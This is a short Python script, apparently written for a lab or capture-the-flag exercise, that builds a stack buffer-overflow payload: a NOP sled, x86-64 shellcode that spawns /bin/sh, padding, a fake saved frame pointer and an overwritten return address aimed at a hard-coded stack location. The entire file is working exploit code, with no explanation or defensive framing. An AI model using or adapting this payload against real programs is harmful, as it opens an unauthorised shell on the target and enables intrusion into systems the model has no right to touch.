import struct 
import sys
shell = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
nops  = b"\x90"*100
rbp   = b"BBBBBBBB"
rip   = struct.pack("<Q",0x7fffffffdd78+10)[:6]
buff  = b"A"*(208-len(shell)-len(nops))
sys.stdout.buffer.write(nops+shell+buff+rbp+rip)